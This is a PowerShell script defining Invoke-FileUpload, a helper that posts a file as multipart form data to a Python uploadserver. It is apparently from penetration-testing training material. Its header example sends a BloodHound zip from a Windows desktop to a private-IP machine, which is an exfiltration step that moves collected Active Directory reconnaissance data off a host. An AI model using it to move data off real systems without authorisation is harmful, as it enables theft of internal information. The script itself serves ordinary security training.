<#

PowerShell Script to upload files using uploadserver module 
Github: https://github.com/Densaugeo/uploadserver

To execute the server run in your Linux Machine:
pip3 install uploadserver
python3 -m uploadserver

Example PS:
Invoke-FileUpload -File C:\Users\plaintext\Desktop\20200717080254_BloodHound.zip -Uri http://192.168.49.128:8000/upload

References: https://gist.github.com/arichika/91a8b1f60c87512401e320a614099283

#>

function Invoke-FileUpload {
	Param (
		[Parameter(Position = 0, Mandatory = $True)]
		[String]$File,
		
		[Parameter(Position = 1, Mandatory = $True)]
		[String]$Uri
		)
	
	$FileToUpload = Get-ChildItem -File "$File"
	
	$UTF8woBOM = New-Object "System.Text.UTF8Encoding" -ArgumentList @($false)
	$boundary = '----BCA246E0-E2CF-48ED-AACE-58B35D68B513'
	$tempFile = New-TemporaryFile
	Remove-Item $tempFile -Force -ErrorAction Ignore
	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
	$fileName = [System.IO.Path]::GetFileName($FileToUpload.FullName)
	$sw.Write("--$boundary`r`nContent-Disposition: form-data;name=`"files`";filename=`"$fileName`"`r`n`r`n")
	$sw.Close()
	$fs = New-Object System.IO.FileStream($tempFile, [System.IO.FileMode]::Append)
	$bw = New-Object System.IO.BinaryWriter($fs)
	$fileBinary = [System.IO.File]::ReadAllBytes($FileToUpload.FullName)
	$bw.Write($fileBinary)
	$bw.Close()
	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
	$sw.Write("`r`n--$boundary--`r`n")
	$sw.Close()
	
	Invoke-RestMethod -Method POST -Uri $uri -ContentType "multipart/form-data; boundary=$boundary" -InFile $tempFile
	
	$FileHash = Get-FileHash -Path "$File" -Algorith MD5 
	Write-Host "[+] File Uploaded: " $FileToUpload.FullName
	Write-Host "[+] FileHash: " $FileHash.Hash
}
